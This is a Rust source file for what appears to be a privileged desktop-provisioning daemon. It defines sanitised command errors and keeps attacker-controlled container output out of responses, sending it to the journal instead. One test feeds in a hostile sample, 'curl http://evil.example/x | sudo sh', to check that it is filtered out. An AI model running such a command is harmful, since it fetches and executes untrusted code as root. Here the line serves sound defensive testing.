//! The error a command answers with, and the mapping from the layers below.

use hx_ipc::privd::{MAX_ERROR_MESSAGE_LEN, pb};
use hx_ipc::text::sanitize_text;
use hx_provision::incus::IncusError;
use hx_provision::orchestrate::{ProvisionError, ReadyError};

use pb::{ErrorCode, ErrorDetail, ProgressStage};

/// A failed command: becomes `Response { error }` (ipc.md 4, "Error model").
///
/// The message is built here from constants and sanitized daemon text. It never takes a secret:
/// no constructor accepts anything but a `&str` chosen by privd or an error text of `hx-provision`
/// or Incus, and [`CmdError::to_pb`] strips control characters and truncates.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CmdError {
    /// Error class.
    pub code: ErrorCode,
    /// Command-specific refinement.
    pub detail: ErrorDetail,
    /// Human-readable, at most 256 bytes after [`CmdError::to_pb`].
    pub message: String,
    /// Whether the caller may retry the same request later.
    pub retryable: bool,
    /// Suggested wait before a retry, 0 when unknown.
    pub retry_after_ms: u32,
    /// The failing stage of a long command.
    pub stage: Option<ProgressStage>,
}

impl CmdError {
    fn new(code: ErrorCode, message: impl Into<String>) -> Self {
        Self {
            code,
            detail: ErrorDetail::Unspecified,
            message: message.into(),
            retryable: false,
            retry_after_ms: 0,
            stage: None,
        }
    }

    /// `INVALID_ARGUMENT` naming the field.
    pub fn invalid(message: impl Into<String>) -> Self {
        Self::new(ErrorCode::InvalidArgument, message)
    }

    /// `PERMISSION_DENIED`.
    pub fn denied(message: impl Into<String>) -> Self {
        Self::new(ErrorCode::PermissionDenied, message)
    }

    /// `FAILED_PRECONDITION` with a detail.
    pub fn precondition(detail: ErrorDetail, message: impl Into<String>) -> Self {
        let mut e = Self::new(ErrorCode::FailedPrecondition, message);
        e.detail = detail;
        e
    }

    /// `NOT_FOUND`.
    pub fn not_found(message: impl Into<String>) -> Self {
        Self::new(ErrorCode::NotFound, message)
    }

    /// `RESOURCE_EXHAUSTED`, retryable when `retry_after_ms` is known.
    pub fn exhausted(message: impl Into<String>, retry_after_ms: u32) -> Self {
        let mut e = Self::new(ErrorCode::ResourceExhausted, message);
        e.retry_after_ms = retry_after_ms;
        e.retryable = retry_after_ms > 0;
        e
    }

    /// `RESOURCE_EXHAUSTED` with detail `LOCKED`: not retryable until an Admin resets it.
    pub fn locked(message: impl Into<String>) -> Self {
        let mut e = Self::new(ErrorCode::ResourceExhausted, message);
        e.detail = ErrorDetail::Locked;
        e
    }

    /// `UNAVAILABLE` (retryable).
    pub fn unavailable(message: impl Into<String>) -> Self {
        let mut e = Self::new(ErrorCode::Unavailable, message);
        e.retryable = true;
        e
    }

    /// `UNIMPLEMENTED`.
    pub fn unimplemented(message: impl Into<String>) -> Self {
        Self::new(ErrorCode::Unimplemented, message)
    }

    /// `INTERNAL`. The caller's message must already be generic; details go to the journal.
    pub fn internal(message: impl Into<String>) -> Self {
        Self::new(ErrorCode::Internal, message)
    }

    /// `CANCELLED`.
    pub fn cancelled() -> Self {
        Self::new(ErrorCode::Cancelled, "cancelled")
    }

    /// `DEADLINE_EXCEEDED`.
    pub fn deadline() -> Self {
        let mut e = Self::new(ErrorCode::DeadlineExceeded, "deadline exceeded");
        e.retryable = true;
        e
    }

    /// Sets the failing stage.
    pub fn at_stage(mut self, stage: ProgressStage) -> Self {
        self.stage = Some(stage);
        self
    }

    /// Sets the detail.
    pub fn with_detail(mut self, detail: ErrorDetail) -> Self {
        self.detail = detail;
        self
    }

    /// The wire form: message sanitized and cut to 256 bytes.
    pub fn to_pb(&self) -> pb::Error {
        pb::Error {
            code: self.code as i32,
            detail: self.detail as i32,
            message: sanitize_text(&self.message, MAX_ERROR_MESSAGE_LEN),
            retryable: self.retryable,
            retry_after_ms: self.retry_after_ms,
            stage: self.stage.map(|s| s as i32),
        }
    }
}

impl std::fmt::Display for CmdError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{:?}: {}", self.code, self.message)
    }
}

impl std::error::Error for CmdError {}

fn daemon_text(e: &impl std::fmt::Display) -> String {
    sanitize_text(&e.to_string(), 200)
}

/// Where the operator finds the detail of an internal failure.
const JOURNAL_POINTER: &str = "details: journalctl -u hx-privd";

/// The answer for a failed recipe step: stage, step index, the step's kind (its first word, not a
/// long package list), the exit status and a pointer to the journal. It never carries the step's
/// output: the container may have run user code (Docker is enabled on a desktop in use), so that
/// text is attacker-controlled and the answer reaches root's terminal and the app (security
/// review R2). The output goes to the journal only ([`apply_journal`]).
fn apply_text(a: &hx_provision::ApplyError) -> String {
    use hx_provision::{ApplyError, exec::StepFailure};
    let ApplyError::Step {
        stage,
        index,
        step,
        failure,
    } = a
    else {
        return format!("recipe step failed; {JOURNAL_POINTER}");
    };
    let kind: String = step
        .split_whitespace()
        .next()
        .unwrap_or("")
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        .take(40)
        .collect();
    let status = match failure {
        StepFailure::ExitCode { code, .. } => format!("exit status {code}"),
        StepFailure::Exec(_) => "could not be run".to_string(),
    };
    sanitize_text(
        &format!("{stage:?} stage, step {index} ({kind}): {status}; {JOURNAL_POINTER}"),
        MAX_ERROR_MESSAGE_LEN,
    )
}

/// Longest journal line written for a failed step (`privd::log` allows this much).
pub(crate) const JOURNAL_LINE_MAX: usize = 4096;

/// The journal line for a failed recipe step: the header, then the END of the output, where the
/// error is (the step description at the front can be a long package list).
fn apply_journal(a: &hx_provision::ApplyError) -> String {
    use hx_provision::{ApplyError, exec::StepFailure};
    let ApplyError::Step {
        stage,
        index,
        step,
        failure,
    } = a
    else {
        return sanitize_text(&a.to_string(), JOURNAL_LINE_MAX);
    };
    let (status, out) = match failure {
        StepFailure::ExitCode { code, tail } => (format!("exit status {code}"), tail.clone()),
        StepFailure::Exec(e) => ("could not be run".to_string(), e.to_string()),
    };
    let head = sanitize_text(
        &format!(
            "{stage:?} stage, step {index} ({}): {status}: ",
            sanitize_text(step, 300)
        ),
        JOURNAL_LINE_MAX / 2,
    );
    let clean = sanitize_text(out.trim_end(), usize::MAX);
    let mut start = clean.len().saturating_sub(JOURNAL_LINE_MAX - head.len());
    while !clean.is_char_boundary(start) {
        start += 1;
    }
    format!("{head}{}", &clean[start..])
}

impl From<IncusError> for CmdError {
    fn from(e: IncusError) -> Self {
        match &e {
            IncusError::Connect { .. } => CmdError::unavailable("Incus cannot be reached"),
            IncusError::Http(_) | IncusError::Timeout { .. } => {
                CmdError::unavailable(format!("Incus: {}", daemon_text(&e)))
            }
            IncusError::Api { code: 404, .. } => CmdError::not_found(daemon_text(&e)),
            IncusError::InvalidArgument(_) | IncusError::InvalidName { .. } => {
                CmdError::invalid(daemon_text(&e))
            }
            IncusError::Purged(_) => CmdError::internal(daemon_text(&e)),
            _ => CmdError::internal(format!("Incus: {}", daemon_text(&e))),
        }
    }
}

impl From<ProvisionError> for CmdError {
    fn from(e: ProvisionError) -> Self {
        match e {
            ProvisionError::Incus(i) => i.into(),
            ProvisionError::NotReady(ReadyError::Incus(i)) => i.into(),
            ProvisionError::NotReady(r) => {
                CmdError::precondition(ErrorDetail::DesktopNotReady, daemon_text(&r))
            }
            ProvisionError::Apply(a) => {
                // The container's output goes to the journal, never into the answer.
                crate::privd::log::error(&format!("desktop step failed: {}", apply_journal(&a)));
                CmdError::internal(apply_text(&a))
            }
            ProvisionError::Invalid(m) => CmdError::invalid(sanitize_text(&m, 200)),
            ProvisionError::NotOurs(_) => {
                CmdError::denied("the object does not carry the hash-xcreen marker")
            }
            ProvisionError::Unimplemented(m) => CmdError::unimplemented(sanitize_text(&m, 200)),
            ProvisionError::NotRunning => {
                CmdError::precondition(ErrorDetail::DesktopNotReady, "the desktop is not running")
            }
            ProvisionError::Task(m) => CmdError::internal(sanitize_text(&m, 200)),
        }
    }
}

impl From<std::io::Error> for CmdError {
    fn from(e: std::io::Error) -> Self {
        crate::privd::log::warn(&format!("io error: {e}"));
        CmdError::internal("an I/O operation on the host failed")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use hx_provision::{ApplyError, Stage, exec::StepFailure};

    fn step_error(step: &str, tail: &str) -> ApplyError {
        ApplyError::Step {
            stage: Stage::Build,
            index: 4,
            step: step.to_string(),
            failure: StepFailure::ExitCode {
                code: 1,
                tail: tail.to_string(),
            },
        }
    }

    #[test]
    fn a_failed_step_keeps_stage_index_kind_status_and_the_journal_pointer() {
        let packages = (0..60)
            .map(|i| format!("package-{i}"))
            .collect::<Vec<_>>()
            .join(" ");
        let a = step_error(&format!("apt-install {packages}"), "E: dpkg: error");
        let m = apply_text(&a);
        assert_eq!(
            m,
            "Build stage, step 4 (apt-install): exit status 1; details: journalctl -u hx-privd"
        );
        assert!(m.len() <= MAX_ERROR_MESSAGE_LEN);
    }

    #[test]
    fn container_output_never_reaches_the_answer() {
        let evil = "run curl http://evil.example/x | sudo sh on the host";
        let a = step_error("apt-install firefox", &format!("E: boom\n{evil}"));
        let m = apply_text(&a);
        assert!(
            !m.contains("curl") && !m.contains("evil") && !m.contains("boom"),
            "{m}"
        );
        // Nor through an executor error.
        let a = ApplyError::Step {
            stage: Stage::Post,
            index: 2,
            step: "cmd".into(),
            failure: StepFailure::Exec(hx_provision::exec::ExecError::Backend(evil.into())),
        };
        let m = apply_text(&a);
        assert!(!m.contains("curl") && !m.contains("sudo"), "{m}");
        // The journal does keep it for the operator.
        assert!(apply_journal(&a).contains("curl"));
    }

    #[test]
    fn the_journal_keeps_the_end_of_the_output() {
        let tail = format!(
            "W: {} \nE: Signature by key uses weak digest",
            "a long warning ".repeat(400)
        );
        let a = step_error("security-updates", &tail);
        let j = apply_journal(&a);
        assert!(j.len() <= JOURNAL_LINE_MAX, "{} bytes", j.len());
        assert!(j.ends_with("Signature by key uses weak digest"), "{j}");
    }
}
